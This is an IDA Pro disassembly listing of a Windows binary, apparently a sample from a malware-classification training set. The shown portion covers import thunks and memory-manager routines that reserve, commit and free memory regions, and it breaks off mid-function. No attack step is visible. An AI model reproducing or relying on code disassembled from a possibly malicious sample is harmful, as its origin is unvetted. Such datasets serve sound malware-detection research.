;
; +-------------------------------------------------------------------------+
; |      This file was generated by The Interactive Disassembler (IDA)      |
; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
; |                      License info: 48-B171-7BC4-CE                      |
; |                   Institute For Information Industry                    |
; +-------------------------------------------------------------------------+
;
; Input SHA256 : 29671BF38CBB810716A619F44B3CD69CD29A5A7185D66B52E0A8FC439D6D11A5
; Input MD5    : D0A256ECE54B394C8DBA57651DE19179
; Input CRC32  : 3C36FAEF

; File Name   : /home/cpc/shared-drives/F:/sucbuzzer/train/0003261d3a940c91df9187fd0325e7f8.bytes
; Format      : Dump file

                include uni.inc ; see unicode subdir of ida for info on unicode

                .686p
                .mmx
                .model flat

; ===========================================================================

; Segment type: Pure code
CODE            segment byte public 'CODE' use32
                assume cs:CODE
                ;org 400h
                assume es:nothing, ss:nothing, ds:CODE, fs:nothing, gs:nothing

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_400         proc near               ; CODE XREF: sub_2318+39↓p
                                        ; sub_2318+54↓p
                jmp     dword ptr ds:41512Ch
sub_400         endp

; ---------------------------------------------------------------------------
unk_406         db  8Bh                 ; DATA XREF: CODE:0000C3FC↓o
                db 0C0h
; ---------------------------------------------------------------------------
                jmp     dword ptr ds:415128h
; ---------------------------------------------------------------------------
                align 10h
                jmp     dword ptr ds:415124h
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_418         proc near               ; CODE XREF: sub_218C-31E↓p
                                        ; sub_218C-2E1↓p ...
                jmp     dword ptr ds:415120h
sub_418         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_420         proc near               ; CODE XREF: sub_2318+3F↓p
                                        ; sub_2318+5A↓p
                jmp     dword ptr ds:41511Ch
sub_420         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_428         proc near               ; CODE XREF: sub_23A4+BA↓p
                jmp     dword ptr ds:415118h
sub_428         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_430         proc near               ; CODE XREF: sub_2318+78↓p
                jmp     dword ptr ds:415138h
sub_430         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_438         proc near               ; CODE XREF: sub_23A4+85↓p
                jmp     dword ptr ds:415114h
sub_438         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_440         proc near               ; CODE XREF: CODE:000031E3↓p
                jmp     dword ptr ds:415110h
sub_440         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_448         proc near               ; CODE XREF: sub_30B4+26↓p
                jmp     dword ptr ds:41510Ch
sub_448         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_450         proc near               ; CODE XREF: sub_498+A↓p
                jmp     dword ptr ds:415108h
sub_450         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_458         proc near               ; CODE XREF: CODE:loc_3224↓p
                                        ; CODE:loc_3235↓p
                jmp     dword ptr ds:415104h
sub_458         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_460         proc near               ; CODE XREF: sub_1C38+6B↓p
                jmp     dword ptr ds:415148h
sub_460         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_468         proc near               ; CODE XREF: sub_1C38+22↓p
                jmp     dword ptr ds:415144h
sub_468         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_470         proc near               ; CODE XREF: sub_1C38+55↓p
                jmp     dword ptr ds:415140h
sub_470         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_478         proc near               ; CODE XREF: sub_29DC+16↓p
                jmp     dword ptr ds:415154h
sub_478         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_480         proc near               ; CODE XREF: sub_29A0+E↓p
                                        ; sub_29B8+13↓p
                jmp     dword ptr ds:415150h
sub_480         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_488         proc near               ; CODE XREF: CODE:loc_3244↓p
                jmp     dword ptr ds:415100h
sub_488         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_490         proc near               ; CODE XREF: CODE:000031F7↓p
                                        ; CODE:00003208↓p
                jmp     dword ptr ds:4150FCh
sub_490         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_498         proc near               ; CODE XREF: CODE:000031ED↓p

var_1C          = word ptr -1Ch
var_18          = word ptr -18h

                push    ebx
                add     esp, 0FFFFFFBCh
                mov     ebx, 0Ah
                push    esp
                call    sub_450
                test    byte ptr [esp+48h+var_1C], 1
                jz      short loc_4B3
                movzx   ebx, [esp+48h+var_18]

loc_4B3:                                ; CODE XREF: sub_498+14↑j
                mov     eax, ebx
                add     esp, 44h
                pop     ebx
                retn
sub_498         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_4BC         proc near               ; CODE XREF: sub_4FC+13↓p
                                        ; sub_B88+53↓p
                jmp     dword ptr ds:4150F8h
sub_4BC         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_4C4         proc near               ; CODE XREF: sub_C4C+3F↓p
                                        ; sub_C4C+9D↓p
                jmp     dword ptr ds:4150F4h
sub_4C4         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_4CC         proc near               ; CODE XREF: sub_6A0+2F↓p
                                        ; sub_704+1E↓p ...
                jmp     dword ptr ds:4150F0h
sub_4CC         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_4D4         proc near               ; CODE XREF: sub_6A0+56↓p
                                        ; sub_704+69↓p ...
                jmp     dword ptr ds:4150ECh
sub_4D4         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_4DC         proc near               ; CODE XREF: sub_B88+16↓p
                jmp     dword ptr ds:4150E8h
sub_4DC         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_4E4         proc near               ; CODE XREF: sub_B88+29↓p
                                        ; sub_C4C+2D↓p ...
                jmp     dword ptr ds:4150E4h
sub_4E4         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_4EC         proc near               ; CODE XREF: sub_B88+B0↓p
                                        ; sub_C4C+C6↓p ...
                jmp     dword ptr ds:4150E0h
sub_4EC         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: thunk

sub_4F4         proc near               ; CODE XREF: sub_C4C+D0↓p
                jmp     dword ptr ds:4150DCh
sub_4F4         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4FC         proc near               ; CODE XREF: sub_554+6↓p
                push    ebx
                push    esi
                mov     esi, 40A5D0h
                cmp     dword ptr [esi], 0
                jnz     short loc_542
                push    644h
                push    0
                call    sub_4BC
                mov     ecx, eax
                test    ecx, ecx
                jnz     short loc_51F
                xor     eax, eax
                pop     esi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_51F:                                ; CODE XREF: sub_4FC+1C↑j
                mov     eax, ds:40A5CCh
                mov     [ecx], eax
                mov     ds:40A5CCh, ecx
                xor     edx, edx

loc_52E:                                ; CODE XREF: sub_4FC+44↓j
                mov     eax, edx
                add     eax, eax
                lea     eax, [ecx+eax*8+4]
                mov     ebx, [esi]
                mov     [eax], ebx
                mov     [esi], eax
                inc     edx
                cmp     edx, 64h ; 'd'
                jnz     short loc_52E

loc_542:                                ; CODE XREF: sub_4FC+A↑j
                mov     eax, [esi]
                mov     edx, [eax]
                mov     [esi], edx
                pop     esi
                pop     ebx
                retn
sub_4FC         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_54C         proc near               ; CODE XREF: sub_B88+33↓p
                                        ; sub_B88+3D↓p ...
                mov     [eax], eax
                mov     [eax+4], eax
                retn
sub_54C         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_554         proc near               ; CODE XREF: sub_59C+5D↓p
                                        ; sub_60C+73↓p ...
                push    ebx
                push    esi
                mov     esi, edx
                mov     ebx, eax
                call    sub_4FC
                test    eax, eax
                jnz     short loc_568
                xor     eax, eax
                pop     esi
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_568:                                ; CODE XREF: sub_554+D↑j
                mov     edx, [esi]
                mov     [eax+8], edx
                mov     edx, [esi+4]
                mov     [eax+0Ch], edx
                mov     edx, [ebx]
                mov     [eax], edx
                mov     [eax+4], ebx
                mov     [edx+4], eax
                mov     [ebx], eax
                mov     al, 1
                pop     esi
                pop     ebx
                retn
sub_554         endp


; =============== S U B R O U T I N E =======================================


sub_584         proc near               ; CODE XREF: sub_59C+2C↓p
                                        ; sub_59C+48↓p ...
                mov     edx, [eax+4]
                mov     ecx, [eax]
                mov     [edx], ecx
                mov     [ecx+4], edx
                mov     edx, ds:40A5D0h
                mov     [eax], edx
                mov     ds:40A5D0h, eax
                retn
sub_584         endp


; =============== S U B R O U T I N E =======================================


sub_59C         proc near               ; CODE XREF: sub_948+6C↓p
                                        ; sub_9D8+62↓p ...

var_14          = dword ptr -14h

                push    ebx
                push    esi
                push    edi
                push    ebp
                push    ecx
                mov     esi, ecx
                mov     [esp+14h+var_14], edx
                mov     ebp, eax
                mov     ebx, [ebp+0]
                mov     eax, [esp+14h+var_14]
                mov     edx, [eax]
                mov     [esi], edx
                mov     edx, [eax+4]
                mov     [esi+4], edx

loc_5B8:                                ; CODE XREF: sub_59C+57↓j
                mov     edi, [ebx]
                mov     eax, [esi]
                mov     edx, [ebx+8]
                add     edx, [ebx+0Ch]
                cmp     eax, edx
                jnz     short loc_5DA
                mov     eax, ebx
                call    sub_584
                mov     eax, [ebx+8]
                mov     [esi], eax
                mov     eax, [ebx+0Ch]
                add     [esi+4], eax
                jmp     short loc_5EF
; ---------------------------------------------------------------------------

loc_5DA:                                ; CODE XREF: sub_59C+28↑j
                add     eax, [esi+4]
                cmp     eax, [ebx+8]
                jnz     short loc_5EF
                mov     eax, ebx
                call    sub_584
                mov     eax, [ebx+0Ch]
                add     [esi+4], eax

loc_5EF:                                ; CODE XREF: sub_59C+3C↑j
                                        ; sub_59C+44↑j
                mov     ebx, edi
                cmp     ebp, ebx
                jnz     short loc_5B8
                mov     edx, esi
                mov     eax, ebp
                call    sub_554
                test    al, al
                jnz     short loc_606
                xor     eax, eax
                mov     [esi], eax

loc_606:                                ; CODE XREF: sub_59C+64↑j
                pop     edx
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_59C         endp


; =============== S U B R O U T I N E =======================================


sub_60C         proc near               ; CODE XREF: sub_AFC+7A↓p
                                        ; sub_EE4+99↓p

var_18          = dword ptr -18h
var_14          = dword ptr -14h

                push    ebx
                push    esi
                push    edi
                push    ebp
                add     esp, 0FFFFFFF8h
                mov     ebx, eax
                mov     edi, ebx

loc_617:                                ; CODE XREF: sub_60C+88↓j
                mov     esi, [edx]
                mov     eax, [ebx+8]
                cmp     esi, eax
                jb      short loc_690
                mov     ecx, esi
                add     ecx, [edx+4]
                mov     ebp, eax
                add     ebp, [ebx+0Ch]
                cmp     ecx, ebp
                ja      short loc_690
                cmp     esi, eax
                jnz     short loc_64D
                mov     eax, [edx+4]
                add     [ebx+8], eax
                mov     eax, [edx+4]
                sub     [ebx+0Ch], eax
                cmp     dword ptr [ebx+0Ch], 0
                jnz     short loc_68C
                mov     eax, ebx
                call    sub_584
                jmp     short loc_68C
; ---------------------------------------------------------------------------

loc_64D:                                ; CODE XREF: sub_60C+24↑j
                mov     ecx, esi
                mov     edi, [edx+4]
                add     ecx, edi
                mov     ebp, eax
                add     ebp, [ebx+0Ch]
                cmp     ecx, ebp
                jnz     short loc_662
                sub     [ebx+0Ch], edi
                jmp     short loc_68C
; ---------------------------------------------------------------------------

loc_662:                                ; CODE XREF: sub_60C+4F↑j
                mov     ecx, [edx]
                add     ecx, [edx+4]
                mov     [esp+18h+var_18], ecx
                mov     edi, [ebx+8]
                add     edi, [ebx+0Ch]
                sub     edi, ecx
                mov     [esp+18h+var_14], edi
                sub     esi, eax
                mov     [ebx+0Ch], esi
                mov     edx, esp
                mov     eax, ebx
                call    sub_554
                test    al, al
                jnz     short loc_68C
                xor     eax, eax
                jmp     short loc_698
; ---------------------------------------------------------------------------

loc_68C:                                ; CODE XREF: sub_60C+36↑j
                                        ; sub_60C+3F↑j ...
                mov     al, 1
                jmp     short loc_698
; ---------------------------------------------------------------------------

loc_690:                                ; CODE XREF: sub_60C+12↑j
                                        ; sub_60C+20↑j
                mov     ebx, [ebx]
                cmp     edi, ebx
                jnz     short loc_617
                xor     eax, eax

loc_698:                                ; CODE XREF: sub_60C+7E↑j
                                        ; sub_60C+82↑j
                pop     ecx
                pop     edx
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_60C         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_6A0         proc near               ; CODE XREF: sub_948+5C↓p
                push    ebx
                push    esi
                push    edi
                mov     ebx, edx
                mov     esi, eax
                cmp     esi, 100000h
                jge     short loc_6B6
                mov     esi, 100000h
                jmp     short loc_6C2
; ---------------------------------------------------------------------------

loc_6B6:                                ; CODE XREF: sub_6A0+D↑j
                add     esi, 0FFFFh
                and     esi, 0FFFF0000h

loc_6C2:                                ; CODE XREF: sub_6A0+14↑j
                mov     [ebx+4], esi
                push    1
                push    2000h
                push    esi
                push    0
                call    sub_4CC
                mov     edi, eax
                mov     [ebx], edi
                test    edi, edi
                jz      short loc_6FF
                mov     edx, ebx
                mov     eax, 40A5D4h
                call    sub_554
                test    al, al
                jnz     short loc_6FF
                push    8000h
                push    0
                mov     eax, [ebx]
                push    eax
                call    sub_4D4
                xor     eax, eax
                mov     [ebx], eax

loc_6FF:                                ; CODE XREF: sub_6A0+3A↑j
                                        ; sub_6A0+4A↑j
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_6A0         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_704         proc near               ; CODE XREF: sub_9D8+4C↓p
                                        ; sub_9D8+93↓p
                push    ebx
                push    esi
                push    edi
                push    ebp
                mov     ebx, ecx
                mov     esi, edx
                mov     ebp, eax
                mov     dword ptr [ebx+4], 100000h
                push    4
                push    2000h
                push    100000h
                push    ebp
                call    sub_4CC
                mov     edi, eax
                mov     [ebx], edi
                test    edi, edi
                jnz     short loc_74E
                add     esi, 0FFFFh
                and     esi, 0FFFF0000h
                mov     [ebx+4], esi
                push    4
                push    2000h
                push    esi
                push    ebp
                call    sub_4CC
                mov     [ebx], eax

loc_74E:                                ; CODE XREF: sub_704+29↑j
                cmp     dword ptr [ebx], 0
                jz      short loc_776
                mov     edx, ebx
                mov     eax, 40A5D4h
                call    sub_554
                test    al, al
                jnz     short loc_776
                push    8000h
                push    0
                mov     eax, [ebx]
                push    eax
                call    sub_4D4
                xor     eax, eax
                mov     [ebx], eax

loc_776:                                ; CODE XREF: sub_704+4D↑j
                                        ; sub_704+5D↑j
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_704         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_77C         proc near               ; CODE XREF: sub_948+7E↓p
                                        ; sub_9D8+7A↓p ...

var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h

                push    ebx
                push    esi
                push    edi
                push    ebp
                add     esp, 0FFFFFFECh
                mov     [esp+24h+var_20], ecx
                mov     [esp+24h+var_24], edx
                mov     [esp+24h+var_1C], 0FFFFFFFFh
                xor     edx, edx
                mov     [esp+24h+var_18], edx
                mov     ebp, eax
                mov     eax, [esp+24h+var_24]
                add     eax, ebp
                mov     [esp+24h+var_14], eax
                mov     ebx, ds:40A5D4h
                jmp     short loc_7FC
; ---------------------------------------------------------------------------

loc_7AB:                                ; CODE XREF: sub_77C+86↓j
                mov     edi, [ebx]
                mov     esi, [ebx+8]
                cmp     ebp, esi
                ja      short loc_7FA
                mov     eax, esi
                add     eax, [ebx+0Ch]
                cmp     eax, [esp+24h+var_14]
                ja      short loc_7FA
                cmp     esi, [esp+24h+var_1C]
                jnb     short loc_7C9
                mov     [esp+24h+var_1C], esi

loc_7C9:                                ; CODE XREF: sub_77C+47↑j
                mov     eax, esi
                add     eax, [ebx+0Ch]
                cmp     eax, [esp+24h+var_18]
                jbe     short loc_7D8
                mov     [esp+24h+var_18], eax

loc_7D8:                                ; CODE XREF: sub_77C+56↑j
                push    8000h
                push    0
                push    esi
                call    sub_4D4
                test    eax, eax
                jnz     short loc_7F3
                mov     dword ptr ds:40A5B0h, 1

loc_7F3:                                ; CODE XREF: sub_77C+6B↑j
                mov     eax, ebx
                call    sub_584

loc_7FA:                                ; CODE XREF: sub_77C+36↑j
                                        ; sub_77C+41↑j
                mov     ebx, edi

loc_7FC:                                ; CODE XREF: sub_77C+2D↑j
                cmp     ebx, 40A5D4h
                jnz     short loc_7AB
                mov     eax, [esp+24h+var_20]
                xor     edx, edx
                mov     [eax], edx
                cmp     [esp+24h+var_18], 0
                jz      short loc_82C
                mov     eax, [esp+24h+var_20]
                mov     edx, [esp+24h+var_1C]
                mov     [eax], edx
                mov     eax, [esp+24h+var_18]
                sub     eax, [esp+24h+var_1C]
                mov     edx, [esp+24h+var_20]
                mov     [edx+4], eax

loc_82C:                                ; CODE XREF: sub_77C+95↑j
                add     esp, 14h
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_77C         endp


; =============== S U B R O U T I N E =======================================


sub_834         proc near               ; CODE XREF: sub_948+2D↓p
                                        ; sub_9D8+E6↓p

var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h

                push    ebx
                push    esi
                push    edi
                push    ebp
                add     esp, 0FFFFFFF4h
                mov     [esp+1Ch+var_18], ecx
                mov     [esp+1Ch+var_1C], edx
                mov     edx, eax
                mov     ebp, edx
                and     ebp, 0FFFFF000h
                add     edx, [esp+1Ch+var_1C]
                add     edx, 0FFFh
                and     edx, 0FFFFF000h
                mov     [esp+1Ch+var_14], edx
                mov     eax, [esp+1Ch+var_18]
                mov     [eax], ebp
                mov     eax, [esp+1Ch+var_14]
                sub     eax, ebp
                mov     edx, [esp+1Ch+var_18]
                mov     [edx+4], eax
                mov     esi, ds:40A5D4h
                jmp     short loc_8B6
; ---------------------------------------------------------------------------

loc_87A:                                ; CODE XREF: sub_834+88↓j
                mov     ebx, [esi+8]
                mov     edi, [esi+0Ch]
                add     edi, ebx
                cmp     ebp, ebx
                jbe     short loc_888
                mov     ebx, ebp

loc_888:                                ; CODE XREF: sub_834+50↑j
                cmp     edi, [esp+1Ch+var_14]
                jbe     short loc_892
                mov     edi, [esp+1Ch+var_14]

loc_892:                                ; CODE XREF: sub_834+58↑j
                cmp     edi, ebx
                jbe     short loc_8B4
                push    4
                push    1000h
                sub     edi, ebx
                push    edi
                push    ebx
                call    sub_4CC
                test    eax, eax
                jnz     short loc_8B4
                mov     eax, [esp+1Ch+var_18]
                xor     edx, edx
                mov     [eax], edx
                jmp     short loc_8BE
; ---------------------------------------------------------------------------

loc_8B4:                                ; CODE XREF: sub_834+60↑j
                                        ; sub_834+74↑j
                mov     esi, [esi]

loc_8B6:                                ; CODE XREF: sub_834+44↑j
                cmp     esi, 40A5D4h
                jnz     short loc_87A

loc_8BE:                                ; CODE XREF: sub_834+7E↑j
                add     esp, 0Ch
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_834         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_8C8         proc near               ; CODE XREF: sub_AFC+2E↓p

var_14          = dword ptr -14h

                push    ebx
                push    esi
                push    edi
                push    ebp
                push    ecx
                mov     ebx, eax
                mov     esi, ebx
                add     esi, 0FFFh
                and     esi, 0FFFFF000h
                mov     [esp+14h+var_14], esi
                mov     ebp, ebx
                add     ebp, edx
                and     ebp, 0FFFFF000h
                mov     eax, [esp+14h+var_14]
                mov     [ecx], eax
                mov     eax, ebp
                sub     eax, [esp+14h+var_14]
                mov     [ecx+4], eax
                mov     esi, ds:40A5D4h
                jmp     short loc_937
; ---------------------------------------------------------------------------

loc_8FF:                                ; CODE XREF: sub_8C8+75↓j
                mov     ebx, [esi+8]
                mov     edi, [esi+0Ch]
                add     edi, ebx
                cmp     ebx, [esp+14h+var_14]
                jnb     short loc_90F
                mov     ebx, [esp+14h+var_14]

loc_90F:                                ; CODE XREF: sub_8C8+42↑j
                cmp     ebp, edi
                jnb     short loc_915
                mov     edi, ebp

loc_915:                                ; CODE XREF: sub_8C8+49↑j
                cmp     edi, ebx
                jbe     short loc_935
                push    4000h
                sub     edi, ebx
                push    edi
                push    ebx
                call    sub_4D4
                test    eax, eax
                jnz     short loc_935
                mov     dword ptr ds:40A5B0h, 2

loc_935:                                ; CODE XREF: sub_8C8+4F↑j
                                        ; sub_8C8+61↑j
                mov     esi, [esi]

loc_937:                                ; CODE XREF: sub_8C8+35↑j
                cmp     esi, 40A5D4h
                jnz     short loc_8FF
                pop     edx
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_8C8         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_948         proc near               ; CODE XREF: sub_10F4+B↓p

var_18          = dword ptr -18h

                push    ebx
                push    esi
                push    edi
                push    ebp
                add     esp, 0FFFFFFF8h
                mov     esi, edx
                mov     edi, eax
                mov     ebp, 40A5E4h
                add     edi, 3FFFh
                and     edi, 0FFFFC000h

loc_964:                                ; CODE XREF: sub_948+75↓j
                mov     ebx, [ebp+0]
                jmp     short loc_99C
; ---------------------------------------------------------------------------

loc_969:                                ; CODE XREF: sub_948+56↓j
                cmp     edi, [ebx+0Ch]
                jg      short loc_99A
                mov     ecx, esi

loc_970:                                ; DATA XREF: CODE:0000B598↓o
                mov     edx, edi
                mov     eax, [ebx+8]
                call    sub_834
                cmp     dword ptr [esi], 0
                jz      short loc_9CF
                mov     eax, [esi+4]
                add     [ebx+8], eax
                mov     eax, [esi+4]
                sub     [ebx+0Ch], eax
                cmp     dword ptr [ebx+0Ch], 0
                jnz     short loc_9CF
                mov     eax, ebx
                call    sub_584
                jmp     short loc_9CF
; ---------------------------------------------------------------------------

loc_99A:                                ; CODE XREF: sub_948+24↑j
                mov     ebx, [ebx]

loc_99C:                                ; CODE XREF: sub_948+1F↑j
                cmp     ebx, ebp
                jnz     short loc_969
                mov     edx, esi
                mov     eax, edi
                call    sub_6A0
                cmp     dword ptr [esi], 0
                jz      short loc_9CF
                mov     ecx, esp
                mov     edx, esi
                mov     eax, ebp
                call    sub_59C
                cmp     [esp+18h+var_18], 0
                jnz     short loc_964
                mov     ecx, esp
                mov     edx, [esi+4]
                mov     eax, [esi]
                call    sub_77C
                xor     eax, eax
                mov     [esi], eax

loc_9CF:                                ; CODE XREF: sub_948+35↑j
                                        ; sub_948+47↑j ...
                pop     ecx
                pop     edx
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_948         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_9D8         proc near               ; CODE XREF: sub_1120+10↓p

var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h

                push    ebx
                push    esi
                push    edi
                push    ebp
                add     esp, 0FFFFFFECh
                mov     [esp+24h+var_24], ecx
                mov     edi, edx
                mov     esi, eax
                mov     ebp, 40A5E4h
                add     edi, 3FFFh
                and     edi, 0FFFFC000h

loc_9F7:                                ; CODE XREF: sub_9D8+6C↓j
                                        ; sub_9D8+B3↓j
                mov     ebx, [ebp+0]
                jmp     short loc_9FE
; ---------------------------------------------------------------------------

loc_9FC:                                ; CODE XREF: sub_9D8+2D↓j
                mov     ebx, [ebx]

loc_9FE:                                ; CODE XREF: sub_9D8+22↑j
                cmp     ebx, ebp
                jz      short loc_A07
                cmp     esi, [ebx+8]
                jnz     short loc_9FC

loc_A07:                                ; CODE XREF: sub_9D8+28↑j
                cmp     esi, [ebx+8]
                jnz     short loc_A63
                cmp     edi, [ebx+0Ch]
                jle     loc_AAB
                lea     ecx, [esp+24h+var_20]
                mov     edx, edi
                sub     edx, [ebx+0Ch]
                mov     eax, [ebx+8]
                add     eax, [ebx+0Ch]
                call    sub_704
                cmp     [esp+24h+var_20], 0
                jz      short loc_A63
                lea     ecx, [esp+24h+var_18]
                lea     edx, [esp+24h+var_20]
                mov     eax, ebp
                call    sub_59C
                cmp     [esp+24h+var_18], 0
                jnz     short loc_9F7
                lea     ecx, [esp+24h+var_18]
                mov     edx, [esp+24h+var_1C]
                mov     eax, [esp+24h+var_20]
                call    sub_77C
                mov     eax, [esp+24h+var_24]
                xor     edx, edx
                mov     [eax], edx
                jmp     loc_AF3
; ---------------------------------------------------------------------------

loc_A63:                                ; CODE XREF: sub_9D8+32↑j
                                        ; sub_9D8+56↑j
                lea     ecx, [esp+24h+var_20]
                mov     edx, edi
                mov     eax, esi
                call    sub_704
                cmp     [esp+24h+var_20], 0
                jz      short loc_AAB
                lea     ecx, [esp+24h+var_18]
                lea     edx, [esp+24h+var_20]
                mov     eax, ebp
                call    sub_59C
                cmp     [esp+24h+var_18], 0
                jnz     loc_9F7
                lea     ecx, [esp+24h+var_18]
                mov     edx, [esp+24h+var_1C]
                mov     eax, [esp+24h+var_20]
                call    sub_77C
                mov     eax, [esp+24h+var_24]
                xor     edx, edx
                mov     [eax], edx
                jmp     short loc_AF3
; ---------------------------------------------------------------------------

loc_AAB:                                ; CODE XREF: sub_9D8+37↑j
                                        ; sub_9D8+9D↑j
                mov     ebp, [ebx+8]
                cmp     esi, ebp
                jnz     short loc_AEC
                cmp     edi, [ebx+0Ch]
                jg      short loc_AEC
                mov     ecx, [esp+24h+var_24]
                mov     edx, edi
                mov     eax, ebp
                call    sub_834
                mov     eax, [esp+24h+var_24]
                cmp     dword ptr [eax], 0
                jz      short loc_AF3
                mov     eax, [esp+24h+var_24]
                mov     eax, [eax+4]
                add     [ebx+8], eax
                mov     eax, [esp+24h+var_24]
                mov     eax, [eax+4]
                sub     [ebx+0Ch], eax
                cmp     dword ptr [ebx+0Ch], 0
                jnz     short loc_AF3
                mov     eax, ebx
                call    sub_584
                jmp     short loc_AF3
; ---------------------------------------------------------------------------

loc_AEC:                                ; CODE XREF: sub_9D8+D8↑j
                                        ; sub_9D8+DD↑j
                mov     eax, [esp+24h+var_24]
                xor     edx, edx
                mov     [eax], edx

loc_AF3:                                ; CODE XREF: sub_9D8+86↑j
                                        ; sub_9D8+D1↑j ...
                add     esp, 14h
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_9D8         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_AFC         proc near               ; CODE XREF: sub_EE4+4E↓p
                                        ; sub_EE4+61↓p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h

                push    ebx
                push    esi
                push    edi
                add     esp, 0FFFFFFECh
                mov     edi, ecx
                mov     [esp+20h+var_20], edx
                lea     ebx, [eax+3FFFh]
                and     ebx, 0FFFFC000h
                mov     esi, [esp+20h+var_20]
                add     esi, eax
                and     esi, 0FFFFC000h
                cmp     ebx, esi
                jnb     short loc_B7D
                mov     ecx, edi
                mov     edx, esi
                sub     edx, ebx
                mov     eax, ebx
                call    sub_8C8
                lea     ecx, [esp+20h+var_1C]
                mov     edx, edi
                mov     eax, 40A5E4h
                call    sub_59C
                mov     ebx, [esp+20h+var_1C]
                test    ebx, ebx
                jz      short loc_B66
                lea     ecx, [esp+20h+var_14]
                mov     edx, [esp+20h+var_18]
                mov     eax, ebx
                call    sub_77C
                mov     eax, [esp+20h+var_14]
                mov     [esp+20h+var_1C], eax
                mov     eax, [esp+20h+var_10]
                mov     [esp+20h+var_18], eax

loc_B66:                                ; CODE XREF: sub_AFC+49↑j
                cmp     [esp+20h+var_1C], 0
                jz      short loc_B81
                lea     edx, [esp+20h+var_1C]
                mov     eax, 40A5E4h
                call    sub_60C
                jmp     short loc_B81
; ---------------------------------------------------------------------------

loc_B7D:                                ; CODE XREF: sub_AFC+24↑j
                xor     eax, eax
                mov     [edi], eax

loc_B81:                                ; CODE XREF: sub_AFC+6F↑j
                                        ; sub_AFC+7F↑j
                add     esp, 14h
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_AFC         endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_B88         proc near               ; CODE XREF: sub_1274+14↓p
                                        ; sub_1404+19↓p ...
                push    ebp
                mov     ebp, esp
                xor     edx, edx
                push    ebp
